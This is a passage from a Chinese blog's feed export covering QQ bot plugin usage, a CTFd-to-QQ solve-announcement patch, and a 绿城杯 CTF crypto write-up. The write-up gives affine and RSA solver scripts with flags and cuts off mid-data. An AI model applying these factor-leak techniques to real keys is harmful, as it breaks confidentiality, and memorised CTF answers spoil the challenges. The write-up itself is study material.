<ul>
<li><p><code>/at</code> + <code>qq号</code>，当答句中包含<code>/at</code> + <code>qq号</code>时将会被替换为@某人（即<code>CQ码</code>）<br>例子：问群主在吗答/at123456789在吗</p>
<p>| 群主qq号  | 消息     | 回复       |<br>| ————- | ———— | ————— |<br>| 123456789 | 群主在吗 | @群主 在吗 |</p>
</li>
<li><p><code>/self</code>，当答句中包含<code>/self</code>时将会被替换为发送者的群昵称<br>例子：问你好答/self你好啊</p>
<p>| 发送者 | 消息 | 回复       |<br>| ——— | —— | ————— |<br>| 皆无   | 你好 | 皆无你好啊 |</p>
</li>
<li><p><code>/atself</code>，当答句中包含<code>/atself</code>时将会被替换为@发送者 例子：问你好答/atself你好啊</p>
<p>| 发送者 | 消息 | 回复        |<br>| ——— | —— | —————- |<br>| 皆无   | 你好 | @皆无你好啊 |</p>
</li>
<li><p><code>/ban</code>，当答句中包含<code>/ban</code>后紧跟数字时将会禁言发送者，单位为秒，默认为300 例子：问你好答/ban30你将被禁言30秒</p>
</li>
</ul>
</li>
<li><p>删除</p>
<ul>
<li>删除词条+需要删除的<code>问句</code><br>例子：删除词条你好</li>
<li>删除全局词条+需要删除的<code>问句</code><br>例子：删除全局词条你好</li>
<li>删除全局词库<br>例子：删除全局词库</li>
<li>删除全部词库<br>例子：删除全部词库</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="修复离谱bug"><a href="#修复离谱bug" class="headerlink" title="修复离谱bug"></a>修复离谱bug</h4><p>原版的bug真的是一堆了。在<strong>问</strong>和<strong>答</strong>中间加上一些空格，就能直接让词条变成不可删除状态。这bug。。。总之，修了。问答中间不允许出现空格。</p>
<h4 id="示例图-10"><a href="#示例图-10" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/29/hLpeNSjOIG9gqrU.png" alt="image-20211229000614211"></p>
<h4 id="额外-1"><a href="#额外-1" class="headerlink" title="额外"></a>额外</h4><p>原先权限设置的很开，用户可以肆无忌惮的加全局词库，互相干扰。于是把权限缩小了。</p>
<p>原先权限设置的很死，群聊用户没人权。于是把权限放开了。</p>
<p>但是！放开权限意味着更加危险，我可不想因为小号进去了！！！</p>
<p>所以，加了黑名单功能。懂得都懂，直接用一个单独加的测试黑名单进行演示（枫霜月雨是全宇宙最帅的人）。</p>
<p><img src="https://s2.loli.net/2021/12/28/wiPuF236oOvVQDR.png" alt="img"></p>
<p><img src="https://s2.loli.net/2021/12/28/Qn21OWAJREGsV8w.png" alt="img"></p>
<p>黑名单设置的不严，希望给群友和好友更好的体验。但是~一旦触发，你懂得。</p>
<blockquote>
<p>根据《治安管理处罚法》第二十五条第一款第一项的规定：散布谣言，谎报险情、警情或者以其他方法故意扰乱公共秩序的，处5日以上10日以下拘留，情节较轻的，处5日以下拘留。</p>
<p>同时，如果当事人的行为造成严重危害，依法追究刑事责任。</p>
</blockquote>
<p>希望人没事。</p>
<h3 id="创建别名"><a href="#创建别名" class="headerlink" title="创建别名"></a>创建别名</h3><p>玩不来，并且权限也有点问题。先挂个参考链接吧。</p>
<h4 id="参考链接-10"><a href="#参考链接-10" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/nonebot/discussions/discussions/74">为nonebot2的指令创建别名</a></p>
<h2 id="仅群聊"><a href="#仅群聊" class="headerlink" title="仅群聊"></a>仅群聊</h2><h3 id="QQ音乐点歌"><a href="#QQ音乐点歌" class="headerlink" title="QQ音乐点歌"></a>QQ音乐点歌</h3><h4 id="参考链接-11"><a href="#参考链接-11" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/kanomahoro/nonebot-simplemusic"><em>基于NoneBot2的最简点歌插件，支持网易云、QQ音乐</em> </a></p>
<h4 id="权限-10"><a href="#权限-10" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式（命令更新为qq点歌）"><a href="#使用格式（命令更新为qq点歌）" class="headerlink" title="使用格式（命令更新为qq点歌）"></a>使用格式（命令更新为qq点歌）</h4><ol>
<li>qq<strong>点歌 歌曲名</strong> 在QQ音乐中搜索指定歌曲，如果没有找到则不会有任何响应</li>
<li>qq<strong>点歌 歌曲名 歌手名</strong> 在QQ音乐中搜索指定歌曲，并试图匹配指定歌手，如果没有找到则不会有任何响应</li>
</ol>
<h4 id="示例图-11"><a href="#示例图-11" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/28/r4ERbCvitLkxBzP.png" alt="image-20211228234913372"></p>
<p><img src="https://s2.loli.net/2021/12/28/JpMxXb9j2SyKQL3.png" alt="image-20211228235029336"></p>
<h3 id="掷骰子"><a href="#掷骰子" class="headerlink" title="掷骰子"></a>掷骰子</h3><h4 id="参考链接-12"><a href="#参考链接-12" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/KafCoppelia/nonebot_plugin_roll">扔骰子</a></p>
<h4 id="权限-11"><a href="#权限-11" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-11"><a href="#使用格式-11" class="headerlink" title="使用格式"></a>使用格式</h4><p>rd [x]d[y]</p>
<p>x为数量，y为面数</p>
<h4 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h4><ol>
<li>x or y &gt;1024</li>
<li>x or y &lt;0</li>
<li><code>random.randint(1,100) == 99</code></li>
</ol>
<h4 id="示例图-12"><a href="#示例图-12" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/4BMrqbgEpCI8RKf.png" alt="image-20220126224600444"></p>
<h3 id="疯狂星期四"><a href="#疯狂星期四" class="headerlink" title="疯狂星期四"></a>疯狂星期四</h3><h4 id="参考链接-13"><a href="#参考链接-13" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/KafCoppelia/nonebot_plugin_crazy_thursday">Crazy Thursday</a></p>
<h4 id="权限-12"><a href="#权限-12" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-12"><a href="#使用格式-12" class="headerlink" title="使用格式"></a>使用格式</h4><p>疯狂星期[一到日]</p>
<p>由于我不喜欢文案内容（我的枫酱这么可爱，怎么能说这样的话捏~）改了json里的很多东西。砍了一大半吧。</p>
<h4 id="示例图-13"><a href="#示例图-13" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/2HleKpDdCaINM7R.png" alt="image-20220126225429345"></p>
<h3 id="入群欢迎（原创）"><a href="#入群欢迎（原创）" class="headerlink" title="入群欢迎（原创）"></a>入群欢迎（原创）</h3><p>没啥介绍的，自己写的一个很简单的入群介绍功能，可以定制入群欢迎语。</p>
<h4 id="示例图-14"><a href="#示例图-14" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/C9KXWht7GeFUjb5.png" alt="img"></p>
<h3 id="涩图"><a href="#涩图" class="headerlink" title="涩图"></a>涩图</h3><h4 id="不介绍，不开放"><a href="#不介绍，不开放" class="headerlink" title="不介绍，不开放"></a>不介绍，不开放</h4><h2 id="仅私聊"><a href="#仅私聊" class="headerlink" title="仅私聊"></a>仅私聊</h2><h3 id="定时早晚安（原创）"><a href="#定时早晚安（原创）" class="headerlink" title="定时早晚安（原创）"></a>定时早晚安（原创）</h3><p>技术上可拓展群聊，但是放群里功能鸡肋</p>
<p>定时任务，每天早上5:50和晚上22:00。推送早晚安消息。（城市可定制）</p>
<h3 id="示例图-15"><a href="#示例图-15" class="headerlink" title="示例图"></a>示例图</h3><p><img src="https://s2.loli.net/2021/12/28/WUHw1oNqmXGiVJx.png" alt="image-20211228234711323"></p>
<p><img src="https://s2.loli.net/2021/12/28/zIlHK8Q5fE7tbTM.png" alt="image-20211228234805242"></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>bot</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfbot搭建指南</title>
    <url>/2021/11/19/ctfbot%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h1 id="QQbot搭建记录"><a href="#QQbot搭建记录" class="headerlink" title="QQbot搭建记录"></a>QQbot搭建记录</h1><p>简单记录一下搭一个没有带脑子的qqbot的过程。</p>
<span id="more"></span>
<h2 id="无脑版（裸go-cqhttp"><a href="#无脑版（裸go-cqhttp" class="headerlink" title="无脑版（裸go-cqhttp)"></a>无脑版（裸go-cqhttp)</h2><p>从接口和<code>go-cqhttp</code></p>
<p>先去<a href="https://github.com/Mrs4s/go-cqhttp/releases">release</a>上下载，<code>wget</code>就行。</p>
<p>直接走一波<code>./go-cqhttp</code>，然后会出<code>config.yml</code>，如下配置。</p>
<p>反向代理加上脑子才需要，但是先挂出来吧。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- ws-reverse:</span><br><span class="line">    ## 反向WS Universal 地址</span><br><span class="line">    ## 注意 设置了此项地址后下面两项将会被忽</span><br><span class="line">    universal: ws:&#x2F;&#x2F;127.0.0.1:8080&#x2F;cqhttp&#x2F;ws</span><br><span class="line">    ## 反向WS API 地址</span><br><span class="line">    api: ws:&#x2F;&#x2F;127.0.0.1:8080&#x2F;cqhttp&#x2F;api</span><br><span class="line">    ## 反向WS Event 地址</span><br><span class="line">    event: ws:&#x2F;&#x2F;127.0.0.1:8080&#x2F;cqhttp&#x2F;event</span><br><span class="line">    ## 重连间隔 单位毫秒</span><br><span class="line">    reconnect-interval: 3000</span><br><span class="line">    middlewares:</span><br><span class="line">      &lt;&lt;: *default # 引用默认中间件</span><br></pre></td></tr></table></figure>
<p>然后不行试试<code>127.0.0.1</code>改<code>0.0.0.0</code></p>
<p>还有什么</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod 777 ./go-cqhttp</span><br></pre></td></tr></table></figure>
<p>接着执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./go-cqhttp</span><br></pre></td></tr></table></figure>
<p>然后建议扫码登录。可以先测试下</p>
<p>测试成功后使用这个命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nohup ./go-cqhttp &gt; go.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<p>到浏览器中输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5700&#x2F;send_private_msg?user_id&#x3D;xxxxx&amp;message&#x3D;aaaa</span><br></pre></td></tr></table></figure>
<p>看看能不能收到消息，收到就成功了。</p>
<p>接着改<code>CTFd/CTFd/api/v1/challenges.py</code></p>
<p>加上这两部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">TODO:</span> Convert this into a re-useable decorator</span></span><br><span class="line"><span class="keyword">if</span> config.is_teams_mode() <span class="keyword">and</span> team <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">fails = Fails.query.filter_by(</span><br><span class="line">    account_id=user.account_id, challenge_id=challenge_id</span><br><span class="line">).count()</span><br><span class="line"></span><br><span class="line">challenge = Challenges.query.filter_by(<span class="built_in">id</span>=challenge_id).first_or_404()</span><br><span class="line"><span class="comment">#从这开始</span></span><br><span class="line">challenge_name=challenge.name</span><br><span class="line">challenge_category=challenge.category</span><br><span class="line">user_name=user.name <span class="comment">#这里结束</span></span><br><span class="line"><span class="keyword">if</span> challenge.state == <span class="string">&quot;hidden&quot;</span>:</span><br><span class="line">    abort(<span class="number">404</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> status:  <span class="comment"># The challenge plugin says the input is right</span></span><br><span class="line">                <span class="keyword">if</span> ctftime() <span class="keyword">or</span> current_user.is_admin():</span><br><span class="line">                    chal_class.solve(</span><br><span class="line">                        user=user, team=team, challenge=challenge, request=request</span><br><span class="line">                    )</span><br><span class="line">                    clear_standings()</span><br><span class="line"></span><br><span class="line">                log(</span><br><span class="line">                    <span class="string">&quot;submissions&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;[&#123;date&#125;] &#123;name&#125; submitted &#123;submission&#125; on &#123;challenge_id&#125; with kpm &#123;kpm&#125; [CORRECT]&quot;</span>,</span><br><span class="line">                    submission=request_data[<span class="string">&quot;submission&quot;</span>].encode(<span class="string">&quot;utf-8&quot;</span>),</span><br><span class="line">                    challenge_id=challenge_id,</span><br><span class="line">                    kpm=kpm,</span><br><span class="line">                )</span><br><span class="line">                <span class="comment">#从这里开始加</span></span><br><span class="line">                <span class="comment"># auto-broadcast</span></span><br><span class="line"></span><br><span class="line">                solve_count = Solves.query.filter_by(challenge_id=challenge_id).count()</span><br><span class="line">                blood_number = <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">if</span> solve_count == <span class="number">1</span>:</span><br><span class="line">                    blood_number = <span class="string">&quot;一血&quot;</span></span><br><span class="line">                <span class="keyword">elif</span> solve_count == <span class="number">2</span>:</span><br><span class="line">                    blood_number = <span class="string">&quot;二血&quot;</span></span><br><span class="line">                <span class="keyword">elif</span> solve_count == <span class="number">3</span>:</span><br><span class="line">                    blood_number = <span class="string">&quot;三血&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">if</span> blood_number:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;是三血&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(challenge_category)  <span class="comment"># 题目分类</span></span><br><span class="line">                    <span class="built_in">print</span>(challenge_name)  <span class="comment"># 题目名称</span></span><br><span class="line">                    <span class="built_in">print</span>(user_name)</span><br><span class="line">                    <span class="built_in">print</span>(blood_number)</span><br><span class="line">                    <span class="keyword">import</span> requests</span><br><span class="line">                    url = <span class="string">&quot;http://127.0.0.1:5700/send_group_msg?group_id=xxxxx&amp;message=&quot;</span></span><br><span class="line">                    msg=<span class="string">&quot;恭喜&lt;&#123;&#125;&gt;获得[&#123;&#125;]类型题目《&#123;&#125;》 &#123;&#125;! Tql&quot;</span>.<span class="built_in">format</span>(user_name,challenge_category, challenge_name,blood_number)</span><br><span class="line">                    url=url+msg</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        requests.get(url=url)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;不是三血&quot;</span>)</span><br><span class="line">                    <span class="keyword">import</span> requests</span><br><span class="line">                    url = <span class="string">&quot;http://127.0.0.1:5700/send_group_msg?group_id=xxxxx&amp;message=&quot;</span></span><br><span class="line">                   </span><br><span class="line">                  </span><br><span class="line">                    msg=<span class="string">&quot;恭喜&lt;&#123;&#125;&gt;解出[&#123;&#125;]类型题目《&#123;&#125;》Tql&quot;</span>.<span class="built_in">format</span>(user_name,challenge_category, challenge_name)</span><br><span class="line">                    url=url+msg</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;不是三血开始推送&#x27;</span>)</span><br><span class="line">                        requests.get(url=url)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;不是三血推送成功&#x27;</span>)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;不是三血推送失败&#x27;</span>)</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                <span class="comment">#到这结束    </span></span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="string">&quot;success&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                    <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;correct&quot;</span>, <span class="string">&quot;message&quot;</span>: message&#125;,</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment"># The challenge plugin says the input is wrong</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>bot</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器取证</title>
    <url>/2021/10/15/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码不对呢，为什么不去社工管理员呢？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="e68c94e2dd6a81331d8858e0b8a33e1a4b54d8c985155030b8b69c2c9a2aa54c"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好,接下来的内容需要密码才能阅览。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>电子取证</category>
      </categories>
      <tags>
        <tag>服务器取证</tag>
      </tags>
  </entry>
  <entry>
    <title>绿城杯密码</title>
    <url>/2021/10/06/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="绿城杯密码题"><a href="#绿城杯密码题" class="headerlink" title="绿城杯密码题"></a>绿城杯密码题</h1><p>出题人是真的垃圾，出的这么简单，被全国的师傅打了不知道多少种解。不会出题可以不出，出这种垃圾题简直是在侮辱做题师傅们的智商。</p>
<span id="more"></span>
<h2 id="warmup-50"><a href="#warmup-50" class="headerlink" title="warmup(50)"></a>warmup(50)</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>密码签到题，给了以下脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>]==<span class="string">'flag{'</span></span><br><span class="line"></span><br><span class="line">str1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">plain_text, a, b, m</span>):</span></span><br><span class="line">	cipher_text = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> plain_text:</span><br><span class="line">		<span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">			addr = str1.find(i)</span><br><span class="line">			cipher_text += str1[(a*addr+b) % m]</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			cipher_text += i</span><br><span class="line">	<span class="built_in">print</span>(cipher_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encode(flag,<span class="number">37</span>,<span class="number">23</span>,<span class="number">52</span>)</span><br><span class="line"><span class="comment"># cipher_text = 'aoxL{XaaHKP_tHgwpc_hN_ToXnnht}'</span></span><br></pre></td></tr></table></figure>
<h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>就一个，一眼就能根据加密算法看出来这是affline cipher。</p>
<p>没什么好多说的，加解密函数</p>
<script type="math/tex; mode=display">
E\left( x \right) \,\,=\,\,\left( ax+b \right) \,\,mod\,\,m
\\
D\left( x \right) \,\,=\,\,a^{-1}\left( x-b \right) \,\,mod\,\,m</script><p>求个逆元完事。</p>
<h3 id="解法一（预期解）"><a href="#解法一（预期解）" class="headerlink" title="解法一（预期解）"></a>解法一（预期解）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">cipher_text = <span class="string">'aoxL{XaaHKP_tHgwpc_hN_ToXnnht}'</span></span><br><span class="line">str1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">affline_decode</span>(<span class="params">cipher_text, a, b, m</span>):</span></span><br><span class="line">	plain_text = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher_text:</span><br><span class="line">		<span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">			addr = str1.find(i)</span><br><span class="line">			plain_text += str1[(addr-b) * inverse(a,m) % m]</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			plain_text += i</span><br><span class="line">	<span class="built_in">print</span>(plain_text)</span><br><span class="line"></span><br><span class="line">affline_decode(cipher_text,<span class="number">37</span>,<span class="number">23</span>,<span class="number">52</span>)</span><br><span class="line"><span class="comment">#flag{AffInE_CIpheR_iS_clAssiC}</span></span><br></pre></td></tr></table></figure>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>放进在线工具的仿射密码里，直接能求出flag原文。然后根据加密算法，爆破一下大小写。也是一种不错的解法。这道题和一般的仿射密码的唯一区别在于，一般仿射密码的字母为26个，不区分大小写。而这道题加了大小写的考点，最后肯定是要用到脚本的。</p>
<h2 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA-1"></a>RSA-1</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>]==<span class="string">b'flag{'</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n ='</span>,n)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">M = <span class="number">2021</span> * m * <span class="number">1001</span> * p </span><br><span class="line">c = <span class="built_in">pow</span>(M,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'c ='</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = 17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847</span></span><br><span class="line"><span class="comment">#c = 6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676</span></span><br></pre></td></tr></table></figure>
<h3 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h3><p>考了个小同余的性质。</p>
<script type="math/tex; mode=display">
\text{如果} a\,\,\equiv \,\,b\,\,\left( mod\,\,m \right) \,\,
\\
\text{则有} \left( a,m \right) \,\,=\,\,\left( b,m \right)</script><p>证明过程不写了，比较简单。</p>
<h3 id="解法一（预期解）-1"><a href="#解法一（预期解）-1" class="headerlink" title="解法一（预期解）"></a>解法一（预期解）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847</span></span><br><span class="line">c = <span class="number">6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.gcd(c,n)</span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)//<span class="number">1001</span>//p//<span class="number">2021</span>))</span><br><span class="line"><span class="comment">#b'flag{Math_1s_1nterest1ng_hah}'</span></span><br></pre></td></tr></table></figure>
<h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p>rsatools里面竟然有函数能判断<code>n</code>和<code>c</code>是否有相同因子，属实给我蚌埠住了。大意了，没想到还有用工具做RSA的。放进去直接出<code>d</code>了，然后有<code>d</code>和<code>n</code>能求出<code>p</code>和<code>q</code>，答案就出了。</p>
<p>用工具做密码是没有灵魂的。</p>
<h2 id="RSA-2"><a href="#RSA-2" class="headerlink" title="RSA-2"></a>RSA-2</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>]==<span class="string">b'flag{'</span></span><br><span class="line"></span><br><span class="line">m1 = bytes_to_long(flag[:<span class="number">20</span>])</span><br><span class="line">p  = getPrime(<span class="number">512</span>)</span><br><span class="line">p1 = gmpy2.next_prime(p)</span><br><span class="line">q  = getPrime(<span class="number">512</span>)</span><br><span class="line">q1 = gmpy2.next_prime(q)</span><br><span class="line">n1 = p*q*p1*q1</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n1 ='</span>,n1)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1,e,n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'c1 ='</span>,c1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m2 = bytes_to_long(flag[<span class="number">20</span>:])</span><br><span class="line">p2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q2 = getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'p2+q2 ='</span>,p2+q2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'p2*q2 ='</span>,p2*q2)</span><br><span class="line">n2 = p2*p2*q2*q2*q2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n2 ='</span>,n2)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2,e,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'c2 ='</span>,c2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n1 = 6348779979606280884589422188738902470575876294643492831465947360363568026280963989291591157710389629216109615274754718329987990551836115660879103234129921943824061416396264358110216047994331119920503431491509529604742468032906950984256964560405062345280120526771439940278606226153077959057882262745273394986607004406770035459301695806378598890589432538916219821477777021460189140081521779103226953544426441823244765828342973086422949017937701261348963541035128661464068769033772390320426795044617751909787914185985911277628404632533530390761257251552073493697518547350246993679844132297414094727147161169548160586911</span></span><br><span class="line"><span class="comment">#c1 = 6201882078995455673376327652982610102807874783073703018551044780440620679217833227711395689114659144506630609087600915116940111002026241056808189658969089532597757995423694966667948250438579639890580690392400661711864264184444018345499567505424672090632235109624193289954785503512742400960515331371813467034511130432319427185134018830006918682733848618201088649690422818940385123599468595766345668931882249779415788129316594083269412221804774856038796248038700275509397599351533280014908894068141056694660319816046357462684688942519849441237878018480036145051967731081582598773076490918572392784684372694103015244826</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p2+q2 = 274773146761138462708137582309097386437793891793691383033856524303010811294101933454824485010521468914846151819876043508541879637544444256520741418495479393777132830985856522008561088410862815913292288683761657919121930016956916865849261153721097671315883469348972925757078089715102032241818526925988645578778</span></span><br><span class="line"><span class="comment">#p2*q2 = 18514724270030962172566965941723224386374076294232652258701085781018776172843355920566035157331579524980108190739141959926523082142273672741849552475156278397131571360099018592018959785627785130126477982765210498547680367230723634424036009539347854344573537848628061468892166199866227984167843139793429682559241317072979374002912607549039431398267184818771503468116379618249319324788996321340764624593443106354104274472601170229835219638093242557547840060892527576940077162990069687019966946826210112318408269749294366586682732614372434218768720577917368726530200897558912687470088583774711767599580037663378929000217</span></span><br><span class="line"><span class="comment">#n2 = 